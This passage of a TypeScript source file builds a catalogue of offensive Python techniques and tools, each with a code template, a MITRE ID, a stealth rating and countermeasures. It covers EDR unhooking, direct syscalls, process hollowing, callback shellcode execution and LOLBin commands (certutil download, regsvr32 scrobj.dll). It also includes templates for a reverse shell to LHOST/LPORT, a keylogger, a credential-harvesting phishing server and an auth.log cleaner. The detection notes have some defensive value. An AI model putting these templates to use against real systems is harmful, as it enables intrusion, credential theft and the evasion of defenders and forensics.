      'ctypes CreateProcess(SUSPENDED), NtUnmapViewOfSection, VirtualAllocEx at image base, WriteProcessMemory, SetThreadContext, ResumeThread',
    targetDefense: 'Process Monitoring',
    effectiveness: 0.7,
  })
  add({
    id: 'pyev-unhooking',
    name: 'DLL Unhooking',
    category: 'unhooking',
    description:
      'Remove EDR hooks from ntdll.dll — load clean copy from disk, overwrite .text section, restore original syscall stubs',
    pythonApproach:
      'Read ntdll.dll from C:\\Windows\\System32\\ntdll.dll, parse PE headers, map .text section, VirtualProtect + memcpy to overwrite hooked version',
    targetDefense: 'API Hooking (EDR)',
    effectiveness: 0.65,
  })
  add({
    id: 'pyev-timestomp',
    name: 'Timestamp Manipulation',
    category: 'timestomping',
    description:
      'Modify file timestamps to blend in — change creation, modification, access times to match legitimate system files',
    pythonApproach:
      'os.utime() for access/modification times, ctypes SetFileTime for Windows creation time, match timestamps to nearby legitimate files',
    targetDefense: 'Timeline Forensics',
    effectiveness: 0.7,
  })

  // Additional evasion methods
  add({
    id: 'pyev-lolbins',
    name: 'Living-off-the-Land Binaries (LOLBins)',
    category: 'av_bypass',
    description:
      'Abuse legitimate system binaries for malicious purposes — certutil for download, mshta for script execution, rundll32 for DLL loading, regsvr32 for code execution',
    pythonApproach:
      'subprocess.call() with LOLBin commands: certutil -urlcache -split -f for download, mshta vbscript:Execute() for script exec, regsvr32 /s /n /u /i:url scrobj.dll',
    targetDefense: 'Application Whitelisting',
    effectiveness: 0.75,
  })
  add({
    id: 'pyev-dll-sideload',
    name: 'DLL Side-Loading',
    category: 'edr_bypass',
    description:
      'Abuse legitimate signed applications that load DLLs from current directory — place malicious DLL alongside trusted executable for code execution in signed process',
    pythonApproach:
      'Identify signed applications with missing DLL dependencies, generate malicious DLL with matching export functions via ctypes, place alongside legitimate executable',
    targetDefense: 'Code Signing/Whitelisting',
    effectiveness: 0.7,
  })
  add({
    id: 'pyev-direct-syscalls',
    name: 'Direct Syscalls (ntdll Unhooking)',
    category: 'unhooking',
    description:
      'Bypass EDR hooks by making direct syscalls — resolve syscall numbers dynamically, use assembly stubs to invoke syscalls without going through hooked ntdll',
    pythonApproach:
      'Parse ntdll.dll PE to find syscall numbers from Zw* stubs, generate assembly syscall stub with keystone-engine, invoke via ctypes with function prototype',
    targetDefense: 'API Hooking (EDR)',
    effectiveness: 0.8,
  })
  add({
    id: 'pyev-memory-only',
    name: 'Memory-Only Execution (Fileless)',
    category: 'av_bypass',
    description:
      'Execute payloads entirely in memory without touching disk — memfd_create on Linux, NtCreateSection on Windows, reflective DLL injection',
    pythonApproach:
      'Linux: ctypes syscall for memfd_create, write payload, fexecve. Windows: NtCreateSection + NtMapViewOfSection for memory-only PE loading',
    targetDefense: 'File-based Detection',
    effectiveness: 0.8,
  })
  add({
    id: 'pyev-ppid-spoof',
    name: 'Parent PID Spoofing',
    category: 'edr_bypass',
    description:
      'Spawn processes with spoofed parent PID to bypass EDR parent-child process monitoring — make malicious process appear spawned by legitimate parent',
    pythonApproach:
      'ctypes STARTUPINFOEX with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS set to handle of legitimate process (explorer.exe), CreateProcess with extended startup info',
    targetDefense: 'Process Tree Monitoring',
    effectiveness: 0.7,
  })
  add({
    id: 'pyev-string-encrypt',
    name: 'Runtime String Decryption',
    category: 'obfuscation',
    description:
      'Encrypt all strings at rest in binary — decrypt only at point of use, prevent static string extraction for indicator detection',
    pythonApproach:
      'XOR/AES encrypt all string literals in source, replace with decrypt_string(encrypted_bytes) calls, key derived from runtime context to prevent static extraction',
    targetDefense: 'Static String Analysis',
    effectiveness: 0.65,
  })
  add({
    id: 'pyev-sleep-obfuscation',
    name: 'Sleep Obfuscation / Encryption',
    category: 'edr_bypass',
    description:
      'Encrypt beacon in memory during sleep — prevent memory scanners from finding payload when idle, decrypt before execution, re-encrypt after',
    pythonApproach:
      'AES encrypt payload region before sleep, use VirtualProtect to mark as NO_ACCESS during sleep, decrypt and restore RX permissions on wake for execution',
    targetDefense: 'Memory Scanning',
    effectiveness: 0.75,
  })
  add({
    id: 'pyev-env-keying',
    name: 'Environmental Keying',
    category: 'sandbox_detect',
    description:
      'Key payload execution to specific environment properties — derive decryption key from hostname, domain, MAC address, or installed software to prevent analysis in wrong environment',
    pythonApproach:
      'Derive AES key from environment factors (hostname + domain + MAC hash), attempt payload decryption, only execute if decryption produces valid payload, fail silently otherwise',
    targetDefense: 'Sandbox/Dynamic Analysis',
    effectiveness: 0.8,
  })
  add({
    id: 'pyev-thread-injection',
    name: 'Thread Context Injection',
    category: 'process_hollowing',
    description:
      'Inject code via thread context manipulation — suspend target thread, modify RIP/EIP to point to injected code, resume thread for execution in legitimate process',
    pythonApproach:
      'ctypes SuspendThread, GetThreadContext, modify context.Rip to shellcode address allocated via VirtualAllocEx, SetThreadContext, ResumeThread for execution hijack',
    targetDefense: 'Process Monitoring',
    effectiveness: 0.7,
  })
  add({
    id: 'pyev-callback-exec',
    name: 'Callback Function Execution',
    category: 'av_bypass',
    description:
      'Execute shellcode via Windows API callback functions — use legitimate APIs that accept function pointers (EnumFontsW, EnumWindows, CreateTimerQueueTimer) to run shellcode without CreateThread',
    pythonApproach:
      'ctypes VirtualAlloc shellcode, then call kernel32.EnumSystemLocalesW(shellcode_ptr, 0) or user32.EnumWindows(shellcode_ptr, 0) for callback-based execution',
    targetDefense: 'API Call Monitoring',
    effectiveness: 0.65,
  })

  return db
}

function buildPythonTools(): PythonTool[] {
  const db: PythonTool[] = []
  const add = (t: PythonTool) => {
    db.push(t)
  }

  // Recon tools
  add({
    id: 'pytool-portscanner',
    name: 'Threaded Port Scanner',
    domain: 'reconnaissance',
    description:
      'Multi-threaded TCP connect scanner with banner grabbing and service fingerprinting',
    pythonLibraries: ['socket', 'concurrent.futures'],
    codeTemplate:
      'with ThreadPoolExecutor(max_workers=100) as executor: futures = {executor.submit(scan_port, target, port): port for port in range(1, 65536)}',
    difficulty: 'beginner',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1046 - Network Service Scanning',
    stealthRating: 0.3,
    reliability: 0.9,
    prerequisites: ['network_access'],
    detection: ['IDS port scan alerts', 'Firewall connection logs'],
    countermeasures: ['Rate limiting', 'Port knocking', 'IDS/IPS rules'],
  })
  add({
    id: 'pytool-subdomain-enum',
    name: 'Subdomain Enumerator',
    domain: 'reconnaissance',
    description:
      'Multi-source subdomain discovery combining DNS brute force, certificate transparency logs, and search engine scraping',
    pythonLibraries: ['dnspython', 'requests', 'concurrent.futures'],
    codeTemplate:
      'for sub in wordlist: try: dns.resolver.resolve(f"{sub}.{domain}", "A"); found.append(sub); except: pass',
    difficulty: 'beginner',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1590.002 - DNS',
    stealthRating: 0.5,
    reliability: 0.85,
    prerequisites: ['target_domain'],
    detection: ['DNS query volume alerts', 'CT log monitoring'],
    countermeasures: ['DNS rate limiting', 'Wildcard DNS'],
  })

  // Network attack tools
  add({
    id: 'pytool-arp-spoofer',
    name: 'ARP Spoofing Tool',
    domain: 'network_attack',
    description:
      'ARP cache poisoning tool for MITM positioning — bidirectional spoofing with automatic restoration on exit',
    pythonLibraries: ['scapy'],
    codeTemplate:
      'def spoof(target_ip, spoof_ip): pkt = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip); send(pkt, verbose=False)',
    difficulty: 'intermediate',
    targetOS: 'linux',
    mitreTechnique: 'T1557.002 - ARP Cache Poisoning',
    stealthRating: 0.4,
    reliability: 0.85,
    prerequisites: ['same_network_segment', 'root_access'],
    detection: ['ARP monitoring', 'Static ARP entries', 'DAI'],
    countermeasures: ['Dynamic ARP Inspection', 'Static ARP', '802.1X'],
  })
  add({
    id: 'pytool-packet-sniffer',
    name: 'Network Packet Sniffer',
    domain: 'network_attack',
    description:
      'Raw socket packet capture with protocol parsing — IP, TCP, UDP, ICMP header decoding and payload extraction',
    pythonLibraries: ['scapy', 'socket'],
    codeTemplate: 'sniff(iface="eth0", prn=process_packet, filter="tcp port 80", store=0)',
    difficulty: 'beginner',
    targetOS: 'linux',
    mitreTechnique: 'T1040 - Network Sniffing',
    stealthRating: 0.8,
    reliability: 0.95,
    prerequisites: ['promiscuous_mode', 'root_access'],
    detection: ['Network interface monitoring', 'PROMISC detection'],
    countermeasures: ['Encryption (TLS)', 'Network segmentation', 'Switch port security'],
  })

  // Web tools
  add({
    id: 'pytool-dir-buster',
    name: 'Web Directory Brute Forcer',
    domain: 'web_exploitation',
    description:
      'Multi-threaded web directory and file enumeration with custom wordlists, extensions, and response filtering',
    pythonLibraries: ['requests', 'concurrent.futures'],
    codeTemplate:
      'for word in wordlist: for ext in extensions: url = f"{target}/{word}{ext}"; r = requests.get(url); if r.status_code != 404: found.append(url)',
    difficulty: 'beginner',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1595.003 - Wordlist Scanning',
    stealthRating: 0.2,
    reliability: 0.8,
    prerequisites: ['target_url'],
    detection: ['WAF alerts', 'High request volume', 'Error rate spike'],
    countermeasures: ['WAF', 'Rate limiting', 'Custom 404 pages'],
  })
  add({
    id: 'pytool-sqli-scanner',
    name: 'SQL Injection Scanner',
    domain: 'web_exploitation',
    description:
      'Automated SQLi detection with error-based, UNION-based, and time-based blind injection testing across all parameters',
    pythonLibraries: ['requests', 'beautifulsoup4'],
    codeTemplate:
      'payloads = ["\'", "\' OR 1=1--", "\' UNION SELECT NULL--"]; for param in params: for p in payloads: r = requests.get(url, params={param: p}); check_sqli(r)',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1190 - Exploit Public-Facing Application',
    stealthRating: 0.3,
    reliability: 0.75,
    prerequisites: ['target_url', 'parameter_discovery'],
    detection: ['WAF SQL patterns', 'Error log monitoring', 'IDS signatures'],
    countermeasures: ['Parameterized queries', 'WAF', 'Input validation'],
  })

  // Malware tools
  add({
    id: 'pytool-keylogger',
    name: 'Cross-Platform Keylogger',
    domain: 'malware',
    description:
      'Keyboard event capture with active window tracking, clipboard monitoring, and periodic encrypted exfiltration',
    pythonLibraries: ['pynput', 'requests', 'pycryptodome'],
    codeTemplate:
      'from pynput.keyboard import Listener; def on_press(key): log.append(str(key)); listener = Listener(on_press=on_press); listener.start()',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1056.001 - Keylogging',
    stealthRating: 0.5,
    reliability: 0.85,
    prerequisites: ['user_access', 'persistence'],
    detection: ['API hooking detection', 'Process monitoring', 'Behavioral analysis'],
    countermeasures: ['Anti-keylogger software', 'Secure input methods', 'EDR'],
  })
  add({
    id: 'pytool-reverse-shell',
    name: 'Encrypted Reverse Shell',
    domain: 'malware',
    description:
      'AES-encrypted reverse shell with PTY support, file transfer, and persistence capabilities',
    pythonLibraries: ['socket', 'subprocess', 'pycryptodome'],
    codeTemplate:
      'sock = socket.socket(); sock.connect((LHOST, LPORT)); while True: cmd = decrypt(sock.recv(4096)); output = subprocess.check_output(cmd, shell=True); sock.send(encrypt(output))',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1059.006 - Python',
    stealthRating: 0.4,
    reliability: 0.8,
    prerequisites: ['network_access', 'code_execution'],
    detection: [
      'Network anomaly detection',
      'Process tree analysis',
      'Encrypted traffic inspection',
    ],
    countermeasures: ['Egress filtering', 'Application whitelisting', 'Network monitoring'],
  })

  // C2 tools
  add({
    id: 'pytool-dns-c2',
    name: 'DNS Tunneling C2 Server',
    domain: 'c2_framework',
    description:
      'Command and control via DNS queries — commands encoded in TXT records, data exfiltration via subdomain labels',
    pythonLibraries: ['dnspython', 'dnslib', 'pycryptodome'],
    codeTemplate:
      'class DNSHandler: def handle(self, data): query = dns.message.from_wire(data); subdomain = str(query.question[0].name).split(".")[0]; decoded_data = base64.b32decode(subdomain)',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1071.004 - DNS',
    stealthRating: 0.8,
    reliability: 0.7,
    prerequisites: ['dns_server_control', 'domain_name'],
    detection: ['DNS query length analysis', 'Entropy analysis', 'Volume-based anomaly'],
    countermeasures: ['DNS monitoring', 'DNS sinkholing', 'DNS-over-HTTPS inspection'],
  })

  // Evasion tools
  add({
    id: 'pytool-sandbox-detect',
    name: 'Sandbox Detection Suite',
    domain: 'evasion',
    description:
      'Comprehensive sandbox/VM detection — hardware checks, timing analysis, user interaction verification, environment fingerprinting',
    pythonLibraries: ['os', 'ctypes', 'psutil', 'time'],
    codeTemplate:
      'checks = [cpu_count() >= 2, virtual_memory().total > 4*GB, disk_usage("/").total > 60*GB, mouse_moved(), recent_files_exist()]',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1497 - Virtualization/Sandbox Evasion',
    stealthRating: 0.9,
    reliability: 0.7,
    prerequisites: ['code_execution'],
    detection: ['Behavioral analysis of detection routines', 'Anti-analysis technique signatures'],
    countermeasures: [
      'Bare-metal analysis',
      'Kernel-level monitoring',
      'Hardware-assisted analysis',
    ],
  })

  // Privesc tools
  add({
    id: 'pytool-linux-enum',
    name: 'Linux Privilege Escalation Enumerator',
    domain: 'privilege_escalation',
    description:
      'Comprehensive Linux privesc enumeration — SUID/SGID, capabilities, cron jobs, writable paths, kernel version, sudo rules',
    pythonLibraries: ['os', 'subprocess', 'stat', 'grp'],
    codeTemplate:
      'for root, dirs, files in os.walk("/"): for f in files: path = os.path.join(root, f); if os.stat(path).st_mode & stat.S_ISUID: suid_bins.append(path)',
    difficulty: 'intermediate',
    targetOS: 'linux',
    mitreTechnique: 'T1548.001 - Setuid and Setgid',
    stealthRating: 0.7,
    reliability: 0.9,
    prerequisites: ['local_access'],
    detection: ['File access auditing', 'Auditd rules'],
    countermeasures: ['Minimize SUID binaries', 'AppArmor/SELinux', 'Audit logging'],
  })

  // Crypto tools
  add({
    id: 'pytool-hash-cracker',
    name: 'Password Hash Cracker',
    domain: 'crypto_attack',
    description:
      'Multi-algorithm hash cracking — dictionary, rule-based, brute force attacks for MD5, SHA, bcrypt, NTLM with GPU support',
    pythonLibraries: ['hashlib', 'itertools', 'concurrent.futures'],
    codeTemplate:
      'for word in wordlist: if hashlib.md5(word.encode()).hexdigest() == target_hash: return word',
    difficulty: 'beginner',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1110.002 - Password Cracking',
    stealthRating: 0.9,
    reliability: 0.6,
    prerequisites: ['hash_value', 'wordlist'],
    detection: ['Offline — no network detection'],
    countermeasures: ['Strong password policy', 'Argon2/bcrypt', 'Salting'],
  })

  // Social engineering tools
  add({
    id: 'pytool-phishing-server',
    name: 'Phishing Campaign Server',
    domain: 'social_engineering',
    description:
      'Credential harvesting phishing server — cloned login pages, email delivery, click tracking, credential logging',
    pythonLibraries: ['flask', 'requests', 'beautifulsoup4', 'smtplib'],
    codeTemplate:
      'app = Flask(__name__); @app.route("/login", methods=["POST"]): creds = request.form; log_credentials(creds); return redirect(real_site)',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1566.001 - Spearphishing Attachment',
    stealthRating: 0.5,
    reliability: 0.7,
    prerequisites: ['domain_name', 'smtp_access', 'target_list'],
    detection: ['Email security gateways', 'URL reputation', 'User awareness'],
    countermeasures: ['Security awareness training', 'Email filtering', 'MFA'],
  })

  // Forensics evasion tools
  add({
    id: 'pytool-log-cleaner',
    name: 'Log File Cleaner',
    domain: 'forensics_evasion',
    description:
      'Selective log entry removal — parse and filter syslog/auth.log/wtmp/lastlog entries matching attacker IP/username patterns',
    pythonLibraries: ['os', 're', 'struct'],
    codeTemplate:
      'with open("/var/log/auth.log") as f: lines = [l for l in f if attacker_ip not in l]; open("/var/log/auth.log", "w").writelines(lines)',
    difficulty: 'intermediate',
    targetOS: 'linux',
    mitreTechnique: 'T1070.002 - Clear Linux or Mac System Logs',
    stealthRating: 0.6,
    reliability: 0.8,
    prerequisites: ['root_access'],
    detection: ['Log integrity monitoring', 'SIEM gap detection', 'File integrity monitoring'],
    countermeasures: ['Remote logging', 'Immutable logs', 'SIEM with gap detection'],
  })

  // RE tools
  add({
    id: 'pytool-binary-analyzer',
    name: 'Binary Analysis Tool',
    domain: 'reverse_engineering',
    description:
      'PE/ELF binary analysis — import/export tables, string extraction, entropy analysis, packer detection, disassembly',
    pythonLibraries: ['pefile', 'capstone', 'lief'],
    codeTemplate:
      'pe = pefile.PE(path); for entry in pe.DIRECTORY_ENTRY_IMPORT: for imp in entry.imports: print(f"{entry.dll.decode()}: {imp.name.decode()}")',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1027 - Obfuscated Files or Information',
    stealthRating: 0.9,
    reliability: 0.85,
    prerequisites: ['binary_file'],
    detection: ['Offline analysis — no detection'],
    countermeasures: ['Anti-disassembly', 'Packing', 'Obfuscation'],
  })

  // Additional Python tools
  add({
    id: 'pytool-phishing-fw',
    name: 'Automated Phishing Framework',
    domain: 'social_engineering',
    description:
      'Full phishing campaign automation — email template generation, SMTP delivery, click tracking, credential capture, campaign analytics',
    pythonLibraries: ['flask', 'smtplib', 'jinja2', 'requests'],
    codeTemplate:
      'app = Flask(__name__); @app.route("/track/<uid>"): log_click(uid); return redirect(real_url); @app.route("/harvest", methods=["POST"]): save_creds(request.form)',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1566.001 - Spearphishing Attachment',
    stealthRating: 0.4,
    reliability: 0.75,
    prerequisites: ['smtp_server', 'domain', 'target_list'],
    detection: ['Email security gateways', 'URL analysis', 'Brand monitoring'],
    countermeasures: ['Security awareness', 'Email filtering', 'DMARC/SPF/DKIM'],
  })
  add({
    id: 'pytool-wireless-audit',
    name: 'Wireless Audit Toolkit',
    domain: 'network_attack',
    description:
      'WiFi security auditing — AP scanning, deauth, handshake capture, WPA cracking, evil twin deployment, client probing',
    pythonLibraries: ['scapy', 'subprocess'],
    codeTemplate:
      'from scapy.all import *; def scan_aps(iface): sniff(iface=iface, prn=handle_beacon, filter="type mgt subtype beacon", timeout=30)',
    difficulty: 'advanced',
    targetOS: 'linux',
    mitreTechnique: 'T1557 - Adversary in the Middle',
    stealthRating: 0.3,
    reliability: 0.7,
    prerequisites: ['wireless_adapter', 'monitor_mode'],
    detection: ['WIDS', 'Deauth frame monitoring'],
    countermeasures: ['802.11w (PMF)', 'WIDS/WIPS', 'WPA3'],
  })
  add({
    id: 'pytool-cloud-pentest',
    name: 'Cloud Pentesting Suite',
    domain: 'reconnaissance',
    description:
      'Cloud security assessment — AWS/Azure/GCP enumeration, IAM analysis, S3 bucket permissions, Lambda function review, metadata service access',
    pythonLibraries: ['boto3', 'requests', 'azure-identity'],
    codeTemplate:
      'import boto3; sts = boto3.client("sts"); identity = sts.get_caller_identity(); iam = boto3.client("iam"); policies = iam.list_attached_user_policies(UserName=identity["Arn"].split("/")[-1])',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1580 - Cloud Infrastructure Discovery',
    stealthRating: 0.6,
    reliability: 0.8,
    prerequisites: ['cloud_credentials', 'api_access'],
    detection: ['CloudTrail', 'Azure Monitor', 'GCP Audit Logs'],
    countermeasures: ['Least privilege IAM', 'CloudTrail alerting', 'SCPs'],
  })
  add({
    id: 'pytool-ad-attack',
    name: 'Active Directory Attack Tool',
    domain: 'network_attack',
    description:
      'AD attack automation — Kerberoasting, AS-REP roasting, DCSync, Pass-the-Hash, Golden/Silver ticket, LDAP enumeration',
    pythonLibraries: ['impacket', 'ldap3', 'pycryptodome'],
    codeTemplate:
      'from impacket.krb5.kerberosv5 import getKerberosTGT; from impacket.krb5 import constants; tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain)',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1558 - Steal or Forge Kerberos Tickets',
    stealthRating: 0.5,
    reliability: 0.8,
    prerequisites: ['domain_access', 'valid_credentials'],
    detection: ['Kerberos event monitoring', 'Honey tokens', 'ATA/ATP'],
    countermeasures: ['Strong service account passwords', 'Managed service accounts', 'ATA'],
  })
  add({
    id: 'pytool-auto-exploit',
    name: 'Automated Exploit Framework',
    domain: 'exploit_dev',
    description:
      'Automated exploitation pipeline — vulnerability scanning, exploit selection, payload generation, post-exploitation, report generation',
    pythonLibraries: ['pwntools', 'requests', 'python-nmap', 'paramiko'],
    codeTemplate:
      'nm = nmap.PortScanner(); nm.scan(target, arguments="-sV"); for host in nm.all_hosts(): for port in nm[host].all_tcp(): match_exploits(nm[host]["tcp"][port])',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1203 - Exploitation for Client Execution',
    stealthRating: 0.2,
    reliability: 0.6,
    prerequisites: ['target_range', 'exploit_database'],
    detection: ['IDS/IPS', 'Vulnerability scan detection', 'Network monitoring'],
    countermeasures: ['Patch management', 'IDS/IPS', 'Network segmentation'],
  })

  // Crypto tools
  add({
    id: 'pytool-hash-identifier',
    name: 'Hash Type Identifier',
    domain: 'crypto_attack',
    description:
      'Identify hash algorithm from hash string — pattern matching for MD5, SHA family, bcrypt, NTLM, and 200+ hash formats with hashcat mode mapping',
    pythonLibraries: ['hashid', 're'],
    codeTemplate:
      'from hashid import HashID; hid = HashID(); for mode in hid.identifyHash(target_hash): print(f"{mode.name} [hashcat: {mode.hashcat}]")',
    difficulty: 'beginner',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1110.002 - Password Cracking',
    stealthRating: 1.0,
    reliability: 0.8,
    prerequisites: ['hash_value'],
    detection: ['Offline — no detection'],
    countermeasures: ['Use uncommon hash formats'],
  })
  add({
    id: 'pytool-rsa-attack',
    name: 'RSA Attack Suite',
    domain: 'crypto_attack',
    description:
      'Collection of RSA attacks — Wiener, Hastad, Franklin-Reiter, common modulus, factorization with yafu/msieve, Coppersmith small roots',
    pythonLibraries: ['gmpy2', 'sympy', 'pycryptodome'],
    codeTemplate:
      'from gmpy2 import iroot, gcd; n, e = pubkey; # Fermat factorization: a = isqrt(n); b2 = a*a - n; while not is_square(b2): a += 1; b2 = a*a - n',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1588.004 - Digital Certificates',
    stealthRating: 1.0,
    reliability: 0.5,
    prerequisites: ['rsa_public_key', 'ciphertext'],
    detection: ['Offline — no detection'],
    countermeasures: ['Strong key sizes (4096+)', 'Proper padding (OAEP)'],
  })

  // Forensics evasion tools
  add({
    id: 'pytool-timestomper',
    name: 'File Timestamp Manipulator',
    domain: 'forensics_evasion',
    description:
      'Cross-platform file timestamp manipulation — modify MACE timestamps to match reference files, bulk timestamp modification',
    pythonLibraries: ['os', 'ctypes', 'datetime'],
    codeTemplate:
      'ref_stat = os.stat(reference_file); os.utime(target_file, (ref_stat.st_atime, ref_stat.st_mtime))',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1070.006 - Timestomp',
    stealthRating: 0.7,
    reliability: 0.9,
    prerequisites: ['file_access'],
    detection: ['MFT analysis', '$STANDARD_INFORMATION vs $FILE_NAME comparison'],
    countermeasures: ['MFT monitoring', 'Immutable file attributes'],
  })
  add({
    id: 'pytool-stego-tool',
    name: 'Steganography Toolkit',
    domain: 'forensics_evasion',
    description:
      'Image and audio steganography for covert data exfiltration — LSB encoding, DCT domain hiding, spread spectrum audio embedding',
    pythonLibraries: ['pillow', 'wave', 'numpy', 'pycryptodome'],
    codeTemplate:
      'from PIL import Image; img = Image.open("cover.png"); pixels = list(img.getdata()); # Encode data in LSB of each pixel channel',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1027.003 - Steganography',
    stealthRating: 0.9,
    reliability: 0.85,
    prerequisites: ['cover_file', 'data_to_hide'],
    detection: ['Statistical steganalysis', 'Entropy analysis', 'Chi-square test'],
    countermeasures: ['Steganalysis tools', 'File integrity monitoring'],
  })

  // RE tools
  add({
    id: 'pytool-frida-tracer',
    name: 'Frida Dynamic Instrumentation',
    domain: 'reverse_engineering',
    description:
      'Runtime process instrumentation — hook APIs, trace function calls, modify return values, dump memory, bypass protections',
    pythonLibraries: ['frida', 'frida-tools'],
    codeTemplate:
      'import frida; session = frida.attach(pid); script = session.create_script("""Interceptor.attach(ptr("0x1234"), { onEnter: function(args) { console.log(args[0]); }});"""); script.load()',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1055.012 - Process Hollowing',
    stealthRating: 0.5,
    reliability: 0.8,
    prerequisites: ['target_process', 'frida_server'],
    detection: ['Frida detection checks', 'ptrace monitoring'],
    countermeasures: ['Anti-Frida checks', 'Integrity verification'],
  })
  add({
    id: 'pytool-firmware-extractor',
    name: 'Firmware Extraction Tool',
    domain: 'reverse_engineering',
    description:
      'Extract and analyze IoT firmware images — identify filesystems, extract keys/credentials, find vulnerable services and hardcoded secrets',
    pythonLibraries: ['binwalk', 'pefile', 'pyelftools'],
    codeTemplate:
      'import binwalk; for module in binwalk.scan("firmware.bin", signature=True, extract=True): for result in module.results: print(f"0x{result.offset:X}: {result.description}")',
    difficulty: 'intermediate',
    targetOS: 'linux',
    mitreTechnique: 'T1588.002 - Tool',
    stealthRating: 1.0,
    reliability: 0.75,
    prerequisites: ['firmware_image'],
    detection: ['Offline — no detection'],
    countermeasures: ['Firmware encryption', 'Secure boot'],
  })

  // Social engineering tools
  add({
    id: 'pytool-osint-collector',
    name: 'OSINT Collection Framework',
    domain: 'social_engineering',
    description:
      'Automated OSINT collection for social engineering — LinkedIn scraping, email pattern discovery, social media profiling, document metadata extraction',
    pythonLibraries: ['selenium', 'beautifulsoup4', 'requests', 'pygithub'],
    codeTemplate:
      'from selenium import webdriver; driver = webdriver.Chrome(); driver.get(f"https://linkedin.com/company/{target}"); employees = parse_employee_list(driver.page_source)',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1589 - Gather Victim Identity Information',
    stealthRating: 0.7,
    reliability: 0.7,
    prerequisites: ['target_organization'],
    detection: ['Account monitoring', 'Scraping detection'],
    countermeasures: ['Privacy settings', 'Information minimization'],
  })
  add({
    id: 'pytool-email-spoofer',
    name: 'Email Spoofing Tool',
    domain: 'social_engineering',
    description:
      'SMTP email spoofing with SPF/DKIM/DMARC bypass testing — craft emails with spoofed sender, check domain policy compliance',
    pythonLibraries: ['smtplib', 'email', 'dnspython'],
    codeTemplate:
      'import smtplib; from email.mime.text import MIMEText; msg = MIMEText(body); msg["From"] = spoofed_sender; msg["To"] = target; smtp.sendmail(spoofed_sender, target, msg.as_string())',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1566.001 - Spearphishing Attachment',
    stealthRating: 0.4,
    reliability: 0.6,
    prerequisites: ['smtp_relay', 'target_email'],
    detection: ['SPF/DKIM/DMARC checks', 'Email gateway analysis'],
    countermeasures: ['DMARC enforcement', 'Email authentication'],
  })

  // Network attack tools
  add({
    id: 'pytool-mitm-framework',
    name: 'MITM Attack Framework',
    domain: 'network_attack',
    description:
      'Comprehensive MITM toolkit — ARP spoofing, DNS hijacking, SSL stripping, credential extraction, traffic modification in one framework',
    pythonLibraries: ['scapy', 'mitmproxy', 'netfilterqueue'],
    codeTemplate:
      'from scapy.all import *; # ARP spoof + DNS hijack + SSL strip in coordinated attack pipeline',
    difficulty: 'advanced',
    targetOS: 'linux',
    mitreTechnique: 'T1557 - Adversary in the Middle',
    stealthRating: 0.3,
    reliability: 0.8,
    prerequisites: ['same_network', 'root_access'],
    detection: ['ARP monitoring', 'HSTS preload', 'Certificate pinning'],
    countermeasures: ['HSTS', 'Certificate pinning', '802.1X'],
  })
  add({
    id: 'pytool-wifi-cracker',
    name: 'WiFi Password Cracker',
    domain: 'network_attack',
    description:
      'WPA/WPA2 handshake capture and offline cracking — deauth for handshake capture, dictionary and rule-based cracking with hashcat integration',
    pythonLibraries: ['scapy', 'subprocess'],
    codeTemplate:
      'from scapy.all import *; # Deauth attack to force handshake, capture EAPOL frames, extract to hccapx format, crack with hashcat',
    difficulty: 'intermediate',
    targetOS: 'linux',
    mitreTechnique: 'T1110 - Brute Force',
    stealthRating: 0.3,
    reliability: 0.5,
    prerequisites: ['wireless_adapter', 'monitor_mode', 'wordlist'],
    detection: ['WIDS deauth detection', 'Client deauth alerts'],
    countermeasures: ['WPA3', 'Strong passwords', 'WIDS'],
  })

  // Privesc tools
  add({
    id: 'pytool-win-privesc-enum',
    name: 'Windows Privilege Escalation Enumerator',
    domain: 'privilege_escalation',
    description:
      'Windows privesc enumeration — unquoted service paths, writable services, always install elevated, scheduled tasks, token privileges, DLL hijacking',
    pythonLibraries: ['ctypes', 'subprocess', 'winreg'],
    codeTemplate:
      'import subprocess; output = subprocess.check_output("wmic service get name,displayname,pathname,startmode", shell=True); # Parse for unquoted paths with spaces',
    difficulty: 'intermediate',
    targetOS: 'windows',
    mitreTechnique: 'T1574 - Hijack Execution Flow',
    stealthRating: 0.7,
    reliability: 0.85,
    prerequisites: ['local_access'],
    detection: ['Service enumeration monitoring', 'WMI query logging'],
    countermeasures: ['Proper quoting', 'Service hardening', 'Least privilege'],
  })
  add({
    id: 'pytool-linux-privesc-enum',
    name: 'Linux Privilege Escalation Enumerator',
    domain: 'privilege_escalation',
    description:
      'Linux privesc enumeration — SUID binaries, writable cron jobs, sudo misconfiguration, capabilities, kernel version, writable paths, NFS shares',
    pythonLibraries: ['os', 'subprocess', 'stat'],
    codeTemplate:
      'import os, stat; for root, dirs, files in os.walk("/"): for f in files: path = os.path.join(root, f); if os.stat(path).st_mode & stat.S_ISUID: print(f"SUID: {path}")',
    difficulty: 'intermediate',
    targetOS: 'linux',
